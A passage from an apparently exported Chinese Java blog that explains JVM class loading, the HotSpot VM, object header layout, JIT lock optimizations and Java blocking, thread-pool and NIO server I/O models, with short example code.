因此，JVM负责重新解译由Java编译器生成的字节码，并和底层平台协调工作。也就是说，尽管Java编译器生成的结果是平台独立的，但JVM与特定平台相关的。除非两台机器有相同的体系结构，在某个体系结构上安装和使用的 JVM 当被直接复制到另一台机器时，可能就不能正常工作了。 JVM 实例的生命周期 启动：任何一个拥有main方法的class都可以作为JVM实例运行的起点。 运行：main函数为起点，程序中的其他线程均有它启动，包括daemon守护线程和non-daemon普通线程。daemon是JVM自己使用的线程比如GC线程，main方法的初始线程是non-daemon。 消亡：所有线程终止时，JVM实例结束生命。 在JVM上执行Java程序Java 虚拟机在执行 Java 程序的过程中会把它管理的内存划分成若干个不同的数据区域。 每一个在JRE上运行的Java程序都会创建一个JVM实例。编译后的Java类文件和其他被依赖的类文件会被加载到运行环境中。这一步由类加载器（class loaders）协助完成。 首先，类加载器（class loaders）会以字节码（byte code）的形式，加载程序类文件和与JDK绑定的标准 Java 类文件。标准类文件构成了Java API核心类库。引导程序通过定位通常位于jre/lib目录下的核心API类库启动。 然后，扩展机制定位扩展类库，例如一些为开发或执行代码而被添加到Java里新的（可选）包。扩展类通常位于 jre/lib/ext目录下。有时，扩展类会被放到系统属性java.ext.dirs 定义的其他目录下面。程序包使用JAR或ZIP的扩展名。 最后，如果要加载的类没有在Java的标准类库或扩展类库中被找到，加载器会搜索CLASSPATH环境变量下定义的文件路径，CLASSPATH里面包含了诸多存储类文件的地址。系统属性java.class.path对CLASSPATH环境变量做了映射。 像JAR或ZIP这样的归档文件都是包含了一些其他文件目录的独立文件，通常是压缩文件格式。例如，程序中使用的标准类库包含在归档文件 rt.jar中，该文件会和JDK被一同安装。 一旦文件被定位并加载之后，类加载器会执行不同的功能，例如根据JVM的约束进行校验、内存分配，或者在调用构造器设置定义的变量元素之前使用默认值初始化类变量。 当加载程序结束之后，字节码指令被传递给执行引擎。然后JVM借助于绑定到指定平台的特定JVM实现的本地代码和底层操作系统进行交互。请注意，不同平台的实现可能有略微不同。 Reference 《深入理解Java虚拟机：JVM高级特性与最佳实践》 JVM Architecture – Understanding JVM Internals - https://www.javainterviewpoint.com/java-virtual-machine-architecture-in-java/#respond JVM（一）史上最佳入门指南 - https://www.imooc.com/article/272234 JVM基础面试题及原理讲解 - http://www.importnew.com/31126.html JVM系列(一) - JVM总体概述 - https://juejin.im/post/5b4de8185188251af86be259 Java虚拟机（JVM）概述 - http://www.importnew.com/29224.html 可能是把Java内存区域讲的最清楚的一篇文章 - https://juejin.im/post/5b7d69e4e51d4538ca5730cb 深入理解JVM类加载机制 - https://juejin.im/post/5a1d5f286fb9a045132a7100 Java虚拟机 —— 类的加载机制 - https://juejin.im/post/59c4dd9e5188257e876a1aee Jvm原理入门 - https://leeyuan.cf/2018/02/03/Jvm%E5%8E%9F%E7%90%86%E5%85%A5%E9%97%A8/","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】JVM - HotSpot VM","date":"2019-03-05T03:15:48.000Z","path":"2019/03/05/【Java】JVM-HotSpot-VM/","text":"sHotSpot VM 是Sun JDK和OpenJDK中所带的虚拟机，也是目前使用范围最广的Java虚拟机。 但不一定所有人都知道的是，这个目前看起来“血统纯正”的虚拟机在最初并非由Sun公司开发，而是由一家名为“Longview Technologies”的小公司设计的；甚至这个虚拟机最初并非是为Java语言而开发的，它来源于Strongtalk VM。而这款虚拟机中相当多的技术又是来源于一款支持$Self语言实现“达到C语言50%以上的执行效率”的目标而设计的虚拟机， Sun公司注意到了这款虚拟机在JIT编译上有许多优秀的理念和实际效果，在1997年收购了Longview Technologies公司，从而获得了HotSpot VM。 HotSpot VM既继承了Sun之前两款商用虚拟机的优点（如前面提到的准确式内存管理），也有许多自己新的技术优势，如它名称中的HotSpot指的就是它的热点代码探测技术（其实两个VM基本上是同时期的独立产品，HotSpot还稍早一些，HotSpot一开始就是准确式GC，即时编译的时间压力也相对减小，这样有助于引入更多的代码优化技术，输出质量更高的本地代码。 在2006年的JavaOne大会上，Sun公司宣布最终会把Java开源，并在随后的一年，陆续将JDK的各个部分（其中当然也包括了HotSpot VM）在GPL协议下公开了源码，并在此基础上建立了OpenJDK。这样，HotSpot VM便成为了Sun JDK和OpenJDK两个实现极度接近的JDK项目的共同虚拟机。 在2008年和2009年，Oracle公司分别收购了BEA公司和Sun公司，这样Oracle就同时拥有了两款优秀的Java虚拟机：JRockit VM和HotSpot VM。Oracle公司宣布在不久的将来（大约应在发布JDK 8的时候）会完成这两款虚拟机的整合工作，使之优势互补。 整合的方式大致上是在HotSpot的基础上，移植JRockit的优秀特性，譬如使用JRockit的垃圾回收器与MissionControl服务，使用HotSpot的JIT编译器与混合的运行时系统。","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】JVM - Java 对象头（Header）","date":"2019-03-04T14:47:57.000Z","path":"2019/03/04/【Java】JVM-Java对象头/","text":"Java 对象头（Java Object Header）在 HotSpot 虚拟机中，一个对象在内存中存储的布局可以分为三块区域：对象头（Object Header）、实例数据（Instance Data）和对齐填充（Padding）。 当我们在 Java 代码中，使用 new 关键字创建一个对象的时候，JVM 会为这个对象创建一个对应的 instanceOopDesc 对象，这个 instanceOopDesc 对象中包含了对象头（Header）以及实例数据。 instanceOopDesc 对象的结构123456789101112class oopDesc &#123; friend class VMStructs; friend class JVMCIVMStructs;private: // 对象头 volatile markOop _mark; // 元数据 union _metadata &#123; // 对应的Klass对象 Klass* _klass; narrowKlass _compressed_klass; &#125; _metadata; 对象头（Object Header）结构而对象头（Object Header）包括两部分数据： Mark Word（标记字段） 用于存储对象自身的运行时数据，如哈希码（HashCode）、GC 分代年龄、锁状态标志、线程持有的锁、偏向线程 ID、偏向时间戳等等。它是实现轻量级锁和偏向锁的关键。 对应于 instanceOopDesc 对象中的 _mark 字段。 Klass Pointer（类型指针） 是对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例。 对应于 instanceOopDesc 对象中的 _metadata 字段，而 _metadata 字段包含一个普通 _klass 和一个压缩后的 _compressed_klass。 如果这个对象是数组对象的话，还会有一个额外的部分用于存储数组的长度。 Java 对象头长度在 32 位虚拟机中，Java 对象头一般占有两个机器码（ 1 个机器码等于 4 字节，也就是 32 bit）， 12345|--------------------------------------------------------------|| Object Header (64 bits) ||------------------------------------|-------------------------|| Mark Word (32 bits) | Klass Word (32 bits) ||------------------------------------|-------------------------| 但是如果对象是数组类型，则需要三个机器码（即 96 bit），因为 JVM 可以通过 Java 对象的元数据信息确定 Java 对象的大小，但是无法从数组的元数据来确认数组的大小，所以用一块来记录数组长度。 12345|---------------------------------------------------------------------------------|| Object Header (96 bits) ||--------------------------------|-----------------------|------------------------|| Mark Word(32bits) | Klass Word(32bits) | array length(32bits) ||--------------------------------|-----------------------|------------------------| Mark Word（标记字段）对 Mark Word（标记字段）的设计方式上，非常像网络协议报文头：将Mark Word（标记字段）划分为多个比特位区间，并在不同的对象状态下赋予比特位不同的含义。 Mark Word（标记字段）在 32 位 JVM 中的长度是32bit，在 64 位 JVM 中长度是64bit。 Mark Word（标记字段）用于存储对象自身的运行时数据，如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程 ID、偏向时间戳等等。 对象头信息是与对象自身定义的数据无关的额外存储成本，但是考虑到虚拟机的空间效率，Mark Word被设计成一个非固定的数据结构以便在极小的空间内存存储尽量多的数据，它会根据对象的状态复用自己的存储空间，也就是说，Mark Word会随着程序的运行发生变化，变化状态如下（32位虚拟机）： 锁的状态锁的状态总共有四种：无锁状态、偏向锁、轻量级锁和重量级锁。随着锁的竞争，锁可以从偏向锁升级到轻量级锁，再升级的重量级锁（但是锁的升级是单向的，也就是说只能从低到高升级，不会出现锁的降级）。JDK 1.6中默认是开启偏向锁和轻量级锁的，我们也可以通过-XX:-UseBiasedLocking来禁用偏向锁。 JVM一般是这样使用锁和 Mark Word 的： 1，当一个对象没有被当成锁时，这就是一个普通的对象，Mark Word记录对象的HashCode，锁标志位是01，是否偏向锁那一位是0。 2，当对象被当做同步锁，并有一个线程A抢到了锁时，锁标志位还是01，但是否偏向锁那一位改成1，前23bit记录抢到锁的线程id，表示进入偏向锁状态。 3，当线程A再次试图来获得锁时，JVM发现同步锁对象的标志位是01，是否偏向锁是1，也就是偏向状态，Mark Word中记录的线程id就是线程A自己的id，表示线程A已经获得了这个偏向锁，可以执行同步锁的代码。 4，当线程B试图获得这个锁时，JVM发现同步锁处于偏向状态，但是Mark Word中的线程id记录的不是B，那么线程B会先用CAS操作试图获得锁，这里的获得锁操作是有可能成功的，因为线程A一般不会自动释放偏向锁。如果抢锁成功，就把Mark Word里的线程id改为线程B的id，代表线程B获得了这个偏向锁，可以执行同步锁代码。如果抢锁失败，则继续执行步骤5。 5，偏向锁状态抢锁失败，代表当前锁有一定的竞争，偏向锁将升级为轻量级锁。JVM会在当前线程的线程栈中开辟一块单独的空间，里面保存指向对象锁Mark Word的指针，同时在对象锁Mark Word中保存指向这片空间的指针。上述两个保存操作都是CAS操作，如果保存成功，代表线程抢到了同步锁，就把Mark Word中的锁标志位改成00，可以执行同步锁代码。如果保存失败，表示抢锁失败，竞争太激烈，继续执行步骤6。 6，轻量级锁抢锁失败，JVM会使用自旋锁，自旋锁不是一个锁状态，只是代表不断的重试，尝试抢锁。从JDK1.7开始，自旋锁默认启用，自旋次数由JVM决定。如果抢锁成功则执行同步锁代码，如果失败则继续执行步骤7。 7，自旋锁重试之后如果抢锁依然失败，同步锁会升级至重量级锁，锁标志位改为10。在这个状态下，未抢到锁的线程都会被阻塞。 Klass Pointer（类型指针）对象头（Header）的另外一部分是类型指针，即是对象指向它的类的元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例。并不是所有的虚拟机实现都必须在对象数据上保留类型指针，换句话说查找对象的元数据信息并不一定要经过对象本身。另外，如果对象是一个Java数组，那在对象头中还必须有一块用于记录数组长度的数据，因为虚拟机可以通过普通Java对象的元数据信息确定Java对象的大小，但是从数组的元数据中无法确定数组的大小。 Reference 深入理解多线程（三）—— Java的对象头 - https://juejin.im/post/5b7b712951882542e32a956a 【JVM源码探秘】Java对象模型之对象头 - https://hunterzhao.io/post/2018/02/25/hotspot-explore-java-object-header/ 【深入理解多线程】 Java的对象头（三） - https://blog.csdn.net/w372426096/article/details/80079408 【Java对象解析】不得不了解的对象头 - https://blog.csdn.net/zhoufanyang_china/article/details/54601311 Java的对象头和对象组成详解 - https://blog.csdn.net/lkforce/article/details/81128115 Java对象头详解 - https://www.jianshu.com/p/3d38cba67f8b","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】锁 - JVM 对内部锁的优化","date":"2019-03-04T08:08:03.000Z","path":"2019/03/04/【Java】锁-JVM-对内部锁的优化/","text":"背景自 Java 6/Java 7 开始，Java虚拟机对内部锁的实现进行了一些优化（主要针对的是 synchronized）。 这些优化主要包括锁消除（Lock Elision）、锁粗化（Lock Coarsening/Lock Merging）、偏向锁（Biased Locking）以及适应性锁（Adaptive Locking，也称为适应性自旋（Adaptive Spinning）。 锁消除（Lock Elision）锁消除（Lock Elision）是 JIT 编译器对内部锁的具体实现所做的一种优化。即对一些代码上要求同步，但是被检测到不可能存在共享数据竞争的锁进行削除。 锁削除的主要判定依据来源于逃逸分析（Escape Analysis）的数据支持，如果判断到一段代码中，在堆上的所有数据都不会逃逸出去被其他线程访问到，那就可以把它们当作栈上数据对待，认为它们是线程私有的，同步加锁自然就无须进行。 换句话来说，如果同步块所使用的锁对象通过这种分析被证实只能够被一个线程访问，那么 JIT 编译器在编译这个同步块的时候并不生成 synchronized 所表示的锁的申请与释放对应的机器码，而仅生成原临界区代码对应的机器码，这就造成了被动态编译的字节码就像是不包含 monitorenter（申请锁）和 monitorexit（释放锁）这两个字节码指令一样，即消除了锁的使用。这种编译器优化就被称为锁消除（Lock Elision），它使得特定情况下我们可以完全消除锁的开销。 是否需要锁消除也许有人可能会问，变量是否逃逸，对于虚拟机来说需要使用数据流分析来确定，但是程序员自己应该是很清楚的，怎么会在明知道不存在数据争用的情况下要求同步呢？ 答案是有许多同步措施并不是程序员自己加入的，同步的代码在 Java 程序中的普遍程度也许超过了大部分读者的想象。 例子1如果同步块所使用的锁对象通过这种分析被证实只能够被一个线程访问，那么JIT编译器在编译这个同步块的时候就会取消对这部分代码的同步。 如以下代码： 123456public void f() &#123; Test test = new Test(); synchronized(test) &#123; System.out.println(test); &#125; &#125; 代码中对 test 这个对象进行加锁，但是 test 对象的生命周期只在 f() 方法中，并不会被其他线程所访问到，所以在 JIT 编译阶段就会被优化掉。优化成： 1234public void f() &#123; Test test = new Test(); System.out.println(test); &#125; 这里，可能有读者会质疑了，代码是程序员自己写的，程序员难道没有能力判断要不要加锁吗？ 就像以上代码，完全没必要加锁，有经验的开发者一眼就能看的出来的。 其实道理是这样，但是还是有可能有疏忽，比如我们经常在代码中使用 StringBuffer 作为局部变量，而 StringBuffer 中的 append 是线程安全的，有 synchronized 修饰的，这种情况开发者可能会忽略。这时候，JIT 就可以帮忙优化，进行锁消除。 例子2 - StringBufferJava 标准库中的有些类（比如StringBuffer）虽然是线程安全的，但是在实际使用中我们往往不在多个线程间共享这些类的实例。而这些类在实现线程安全的时候往往借助于内部锁。因此，这些类是锁消除优化的常见目标。 我们来看下面的一个例子，这段非常简单的代码仅仅是输出三个字符串相加的结果，无论是源码字面上还是程序语义上都没有同步。 123public String concatString(String s1, String s2, String s3) &#123; return s1 + s2 + s3;&#125; 我们也知道，由于 String 是一个不可变的类，对字符串的连接操作总是通过生成新的 String 对象来进行的，因此 Javac 编译器会对 String 连接做自动优化。在 JDK 1.5 之前，会转化为 StringBuffer 对象的连续 append() 操作，在 JDK 1.5 及以后的版本中，会转化为 StringBuilder 对象的连续 append() 操作。 即上面的代码等价于下面这样 ： 1234567public String concatString(String s1, String s2, String s3) &#123; StringBuffer sb = new StringBuffer(); sb.append(s1); sb.append(s2); sb.append(s3); return sb.toString();&#125; 现在大家还认为这段代码没有涉及同步吗？每个 StringBuffer.append() 方法中都有一个同步块，锁就是 sb 对象。虚拟机观察变量 sb，很快就会发现它的动态作用域被限制在 concatString() 方法内部。也就是 sb 的所有引用永远不会“逃逸”到 concatString() 方法之外，其他线程无法访问到它，所以这里虽然有锁，但是可以被安全地削除掉，在即时编译之后，这段代码就会忽略掉所有的同步而直接执行了。 锁粗化（Lock Coarsening/Lock Merging）锁粗化（Lock Coarsening/Lock Merging）也是 JIT 编译器对内部锁的具体实现所做的一种优化。 原则上，我们在编写代码的时候，总是推荐将同步块的作用范围限制得尽量小——只在共享数据的实际作用域中才进行同步，这样是为了使得需要同步的操作数量尽可能变小，如果存在锁竞争，那等待锁的线程也能尽快地拿到锁。 大部分情况下，上面的原则都是正确的，但是如果一系列的连续操作都对同一个对象反复加锁和解锁，甚至加锁操作是出现在循环体中的，那即使没有线程竞争，频繁地进行互斥同步操作也会导致不必要的性能损耗。 在上面举的连续调用 append() 方法的例子就属于这类情况。如果虚拟机探测到有这样一串零碎的操作都对同一个对象加锁，将会把加锁同步的范围扩展（膨胀）到整个操作序列的外部，就是扩展到第一个 append() 操作之前直至最后一个 append() 操作之后，这样只需要加锁一次就可以了。 轻量级锁JDK 1.6 引入了偏向锁和轻量级锁，从而让锁拥有了四个状态：无锁状态（unlocked）、偏向锁状态（biasble）、轻量级锁状态（lightweight locked）和重量级锁状态（inflated）。 “轻量级”是相对于使用操作系统互斥量来实现的传统锁而言的，因此传统的锁机制就被称为“重量级”锁。 需要强调一点的是，轻量级锁并不是用来代替重量级锁的，它的本意是在没有多线程竞争的前提下，减少传统的重量级锁使用操作系统互斥量产生的性能消耗。 轻量级锁是相对于传统的重量级锁而言，它使用 CAS 操作来避免重量级锁使用互斥量的开销。对于绝大部分的锁，在整个同步周期内都是不存在竞争的，因此也就不需要都使用互斥量进行同步，可以先采用 CAS 操作进行同步，如果 CAS 失败了再改用互斥量进行同步。 当尝试获取一个锁对象时，如果锁对象标记为 0 01，说明锁对象的锁未锁定（unlocked）状态。此时虚拟机在当前线程的虚拟机栈中创建 Lock Record，然后使用 CAS 操作将对象的 Mark Word 更新为 Lock Record 指针。如果 CAS 操作成功了，那么线程就获取了该对象上的锁，并且对象的 Mark Word 的锁标记变为 00，表示该对象处于轻量级锁状态。 如果 CAS 操作失败了，虚拟机首先会检查对象的 Mark Word 是否指向当前线程的虚拟机栈，如果是的话说明当前线程已经拥有了这个锁对象，那就可以直接进入同步块继续执行，否则说明这个锁对象已经被其他线程线程抢占了。如果有两条以上的线程争用同一个锁，那轻量级锁就不再有效，要膨胀为重量级锁。 偏向锁（Biased Lock）背景偏向锁也是 JDK 1.6 中引入的一项锁优化，它的目的是消除数据在无竞争情况下的同步原语，进一步提高程序的运行性能。 这种优化基于这样的观测结果（Observation）：大多数锁并没有被争用（Contented），并且这些锁在其整个生命周期内至多只会被一个线程持有。 如果说轻量级锁是在无竞争的情况下使用 CAS 操作去消除同步使用的互斥量，那偏向锁就是在无竞争的情况下把整个同步都消除掉，连 CAS 操作都不做了。 偏向锁（Biased Lock）偏向锁的“偏”，就是偏心的“偏”、偏袒的“偏”。它的意思是这个锁会偏向于第一个获得它的线程，如果在接下来的执行过程中，该锁没有被其他的线程获取，则持有偏向锁的线程将永远不需要再进行同步。 因为，Java 虚拟机在实现 monitorenter 字节码（申请锁）和 monitorexit 字节码（释放锁）时，需要借助一个原子操作（CAS操作），这个操作代价相对来说比较昂贵。 因此，Java 虚拟机会为每个对象维护一个偏好（Bias），即一个对象对应的内部锁第 1 次被一个线程获得，那么这个线程就会被记录为该对象的偏好线程（Biased Thread）。 这个线程后续无论是再次申请该锁还是释放该锁，都无须借助原先（指未实施偏向锁优化前）昂贵的原子操作，从而减少了锁的申请与释放的开销。 然而，一个锁没有被争用并不代表仅仅只有一个线程访问该锁，当一个对象的偏好线程以外的其他线程申请该对象的内部锁时，Java 虚拟机需要收回（Revoke）该对象对原偏好线程的“偏好”并重新设置该对象的偏好线程。这个偏好收回和重新分配过程的代价也是比较昂贵的，因此如果程序运行过程中存在比较多的锁争用的情况，那么这种偏好收回和重新分配的代价便会被放大。有鉴于此，偏向锁优化只适合于存在相当大一部分锁并没有被争用的系统之中。如果系统中存在大量被争用的锁而没有被争用的锁仅占极小的部分，那么我们可以考虑关闭偏向锁优化。 假设当前虚拟机启用了偏向锁（启用参数-XX:+UseBiasedLocking，这是JDK 1.6的默认值），那么，当锁对象第一次被线程获取的时候，虚拟机将会把对象头中的标志位设为“01”，即偏向模式。同时使用 CAS 操作把获取到这个锁的线程的ID记录在对象的 Mark Word 之中，如果CAS操作成功，持有偏向锁的线程以后每次进入这个锁相关的同步块时，虚拟机都可以不再进行任何同步操作（例如Locking、Unlocking及对Mark Word的Update等）。 当有另外一个线程去尝试获取这个锁时，偏向模式就宣告结束。根据锁对象目前是否处于被锁定的状态，撤销偏向（Revoke Bias）后恢复到未锁定（标志位为“01”）或轻量级锁定（标志位为“00”）的状态，后续的同步操作就如上面介绍的轻量级锁那样执行。 偏向锁可以提高带有同步但无竞争的程序性能。它同样是一个带有效益权衡（Trade Off）性质的优化，也就是说它并不一定总是对程序运行有利，如果程序中大多数的锁都总是被多个不同的线程访问，那偏向模式就是多余的。在具体问题具体分析的前提下，有时候使用参数-XX:-UseBiasedLocking来禁止偏向锁优化反而可以提升性能。 适应性自旋锁（Adaptive Spinning Lock）适应性自旋（ Adaptive Spinning ）是 JIT 编译器对内部锁实现所做的一种优化。 自旋锁的自适应（Adaptive）性所谓自适应（Adaptive）就意味着自旋的次数不再是固定的，它是由前一次在同一个锁上的自旋时间及锁的拥有者的状态来决定。 它具体怎么做呢？线程如果自旋成功了，那么下次自旋的次数会更加多。 因为虚拟机认为既然上次成功了，那么此次自旋也很有可能会再次成功，那么它就会允许自旋等待持续的次数更多。 反之，如果对于某个锁，很少有自旋能够成功的，那么在以后要或者这个锁的时候自旋的次数会减少甚至省略掉自旋过程，以免浪费处理器资源。 有了自适应自旋锁，随着程序运行和性能监控信息的不断完善，虚拟机对程序锁的状况预测会越来越准确，虚拟机会变得越来越聪明。 Reference 《深入理解Java虚拟机》 Java多线程编程那些事：Java虚拟机对内部锁的优化 - https://zhuanlan.zhihu.com/p/30003980 【深入理解多线程】 Java虚拟机的锁优化技术（五） - https://blog.csdn.net/w372426096/article/details/80079605 Java 并发：深入分析 synchronized 的实现原理 - https://juejin.im/entry/58a702b9128fe1006cb91707","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】I/O - I/O 模型与服务端编程","date":"2019-03-04T07:11:44.000Z","path":"2019/03/04/【Java】IO--IO-模型/","text":"背景对于 Unix 中的五种 I/O 模型： 阻塞 I/O（blocking I/O） 非阻塞 I/O（non-blocking I/O） I/O 多路复用（I/O multiplxing） 信号驱动 I/O（signal driven I/O） 异步 I/O（asynchronous I/O） 除信号驱动 I/O 外，Java 对其它四种 I/O 模型都有所支持。 在服务端编程不断进化的过程中，出现了以下模式： 阻塞 I/O 模式（Blocking I/O） 阻塞 I/O （Blocking I/O） + 多线程（multithreading） 阻塞 I/O （Blocking I/O） + 线程池（Thread Pool） 非阻塞 I/O 模式（Non-blocking I/O） 异步 I/O 模式（Asynchronous I/O） 其中 Java 最早提供的 blocking I/O 即是阻塞 I/O，而 NIO 即是非阻塞 I/O （non-blocking I/O）。而通过 NIO 实现的 Reactor 模式即是 I/O 多路复用模型的实现，通过 AIO 实现的 Proactor 模式即是异步I/O模型的实现。 阻塞 I/O 模式（Blocking I/O）使用阻塞 I/O 的服务器，一般使用 while(true) 循环，在一个线程中，逐个接受连接请求并读取数据，然后处理下一个请求。 代码实现如下所示： 123456789101112131415161718192021222324public class IOServer &#123; private static final Logger LOGGER = LoggerFactory.getLogger(IOServer.class); public static void main(String[] args) &#123; ServerSocket serverSocket = null; try &#123; serverSocket = new ServerSocket(); serverSocket.bind(new InetSocketAddress(2345)); &#125; catch (IOException ex) &#123; LOGGER.error(\"Listen failed\", ex); return; &#125; try&#123; while(true) &#123; Socket socket = serverSocket.accept(); InputStream inputstream = socket.getInputStream(); LOGGER.info(\"Received message &#123;&#125;\", IOUtils.toString(inputstream)); IOUtils.closeQuietly(inputstream); &#125; &#125; catch(IOException ex) &#123; IOUtils.closeQuietly(serverSocket); LOGGER.error(\"Read message failed\", ex); &#125; &#125;&#125; 阻塞 I/O （Blocking I/O） + 多线程（multithreading）上例使用单线程逐个处理所有请求，缺点在于同一时间只能处理一个请求，而且在线程等待 I/O 而被阻塞的过程，不能充分利用 CPU 资源，最终能够对连接请求处理的吞吐率较低。 为此，我们使用多线程对阻塞 I/O 模型的改进，提出阻塞 I/O 模式 + 多线程模型，即为每个请求创建一个线程。一个连接建立成功后，创建一个单独的线程处理其 I/O 操作。 这是一种在传统的网络服务设计中的经典模式，而另外一种是线程池（我们在下文会介绍）。 该模型最大的问题就是缺乏弹性伸缩能力，当客户端并发访问量增加后，服务端的线程个数和客户端并发访问数呈 1：1 的正比关系，由于线程是 Java 虚拟机非常宝贵的系统资源，当线程数膨胀之后，系统的性能将急剧下降，随着并发访问量的继续增大，系统会发生线程堆栈溢出、创建新线程 失败等问题，并最终导致进程宕机或者僵死，不能对外提供服务。 代码实现如下所示： 123456789101112131415161718192021222324252627282930public class IOServerMultiThread &#123; private static final Logger LOGGER = LoggerFactory.getLogger(IOServerMultiThread.class); public static void main(String[] args) &#123; ServerSocket serverSocket = null; try &#123; serverSocket = new ServerSocket(); serverSocket.bind(new InetSocketAddress(2345)); &#125; catch (IOException ex) &#123; LOGGER.error(\"Listen failed\", ex); return; &#125; try&#123; while(true) &#123; Socket socket = serverSocket.accept(); new Thread( () -&gt; &#123; try&#123; InputStream inputstream = socket.getInputStream(); LOGGER.info(\"Received message &#123;&#125;\", IOUtils.toString(inputstream)); IOUtils.closeQuietly(inputstream); &#125; catch (IOException ex) &#123; LOGGER.error(\"Read message failed\", ex); &#125; &#125;).start(); &#125; &#125; catch(IOException ex) &#123; IOUtils.closeQuietly(serverSocket); LOGGER.error(\"Accept connection failed\", ex); &#125; &#125;&#125; 阻塞 I/O （Blocking I/O） + 线程池（Thread Pool）在上面的”阻塞 I/O 模式 + 多线程“ 模型中，虽然实现起来简单。但是，当连接数量达到上限时，再有用户请求连接，直接会导致资源瓶颈，严重的可能会直接导致服务器崩溃。 同时，线程不断地重复创建和销毁会带来的大量的性能开销。 为此，我们可以采用线程池（thread pool）来进行优化，即，采用线程池和任务队列可以实现一种叫做伪异步的 I/O 通信框架。 当有新的客户端接入的时候，将客户端的 Socket 封装成一个 Task（该任务实现 java.lang.Runnable 接口）投递到后端的线程池中进行处理，当这个 Task 处理完成后会被自动放回线程池中。JDK 的线程池维护一个消息队列和 N 个活跃线程对消息队列中的任务进行处理。由于线程池 可以设置消息队列的大小和最大线程数，因此，它的资源占用是可控的，无论多少个客户端并发访问，都不会导致资源的耗尽和宕机。 总结：重用线程避免了频率地创建和销毁线程带来的开销。 但是，阻塞 I/O 模式 + 线程池从根本上解决同步 I/O 导致的通信线程阻塞问题。下面我们就简单分析下如果通信 对方返回应答时间过长，会引起的级联故障。 代码实现如下所示： 123456789101112131415161718192021222324252627282930313233public class IOServerThreadPool &#123; private static final Logger LOGGER = LoggerFactory.getLogger(IOServerThreadPool.class); public static void main(String[] args) &#123; ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); ServerSocket serverSocket = null; try &#123; serverSocket = new ServerSocket(); serverSocket.bind(new InetSocketAddress(2345)); &#125; catch (IOException ex) &#123; LOGGER.error(\"Listen failed\", ex); return; &#125; try&#123; while(true) &#123; Socket socket = serverSocket.accept(); executorService.submit(() -&gt; &#123; try&#123; InputStream inputstream = socket.getInputStream(); LOGGER.info(\"Received message &#123;&#125;\", IOUtils.toString(new InputStreamReader(inputstream))); &#125; catch (IOException ex) &#123; LOGGER.error(\"Read message failed\", ex); &#125; &#125;); &#125; &#125; catch(IOException ex) &#123; try &#123; serverSocket.close(); &#125; catch (IOException e) &#123; &#125; LOGGER.error(\"Accept connection failed\", ex); &#125; &#125;&#125; 潜在问题在大量短连接的场景中性能会有提升，因为不用每次都创建和销毁线程，而是重用连接池中的线程。但在大量长连接的场景中，因为线程被连接长期占用，因而当有新连接请求到来时，可能没有可用的空闲线程来进行处理，最终导致较慢的服务响应时间（response time）。 虽然这种方法可以适用于小到中度规模的客户端的并发数，如果连接数超过 10000或更多，那么性能将很不理想。 非阻塞 I/O 模式（Non-blocking I/O）背景“阻塞I/O+线程池”网络模型虽然比”阻塞I/O+多线程”网络模型在性能方面有提升。但这两种模型都存在一个共同的问题：读和写操作都是同步阻塞的，面对大并发（持续大量连接同时请求）的场景，需要消耗大量的线程来维持连接。 因而，CPU 在大量的线程之间频繁切换，性能损耗很大。一旦单机的连接超过1万，甚至达到几万的时候，服务器的性能会急剧下降。 NIO 的 Selector 很好地解决了这个问题，用主线程（一个线程或者是 CPU 个数的线程）保持住所有的连接，管理和读取客户端连接的数据，将读取的数据交给后面的线程池处理，线程池处理完业务逻辑后，将结果交给主线程发送响应给客户端，少量的线程就可以处理大量连接的请求。 从IO到NIO面向流 vs. 面向缓冲Java IO 是面向流的，每次从流（InputStream/OutputStream）中读一个或多个字节，直到读取完所有字节，它们没有被缓存在任何地方。另外，它不能前后移动流中的数据，如需前后移动处理，需要先将其缓存至一个缓冲区。 Java NIO 面向缓冲，数据会被读取到一个缓冲区，需要时可以在缓冲区中前后移动处理，这增加了处理过程的灵活性。但与此同时，在处理缓冲区前，需要检查该缓冲区中是否包含有所需要处理的数据，并需要确保更多数据读入缓冲区时，不会覆盖缓冲区内尚未处理的数据。 阻塞 vs. 非阻塞Java IO的各种流是阻塞的。当某个线程调用 read() 或 write() 方法时，该线程被阻塞，直到有数据被读取到或者数据完全写入。阻塞期间该线程无法处理任何其它事情。 Java NIO为非阻塞模式。读写请求并不会阻塞当前线程，在数据可读/写前当前线程可以继续做其它事情，所以一个单独的线程可以管理多个输入和输出通道。 选择器（Selector）Java NIO 的选择器（Selector）允许一个单独的线程同时监视多个通道，可以注册多个通道到同一个选择器上，然后使用一个单独的线程来“选择”已经就绪的通道。这种“选择”机制为一个单独线程管理多个通道提供了可能。 零拷贝（Zero-copy）Java NIO中提供的FileChannel拥有transferTo和transferFrom两个方法，可直接把FileChannel中的数据拷贝到另外一个Channel，或者直接把另外一个Channel中的数据拷贝到FileChannel。 该接口常被用于高效的网络/文件的数据传输和大文件拷贝。在操作系统支持的情况下，通过该方法传输数据并不需要将源数据从内核态拷贝到用户态，再从用户态拷贝到目标通道的内核态，同时也避免了两次用户态和内核态间的上下文切换，也即使用了“零拷贝”，所以其性能一般高于 Java I/O中提供的方法。 使用FileChannel的零拷贝将本地文件内容传输到网络的示例代码如下所示。 12345678910111213141516public class NIOClient &#123; public static void main(String[] args) throws IOException, InterruptedException &#123; SocketChannel socketChannel = SocketChannel.open(); InetSocketAddress address = new InetSocketAddress(1234); socketChannel.connect(address); RandomAccessFile file = new RandomAccessFile( NIOClient.class.getClassLoader().getResource(\"test.txt\").getFile(), \"rw\"); FileChannel channel = file.getChannel(); channel.transferTo(0, channel.size(), socketChannel); channel.close(); file.close(); socketChannel.close(); &#125;&#125; 异步 I/O 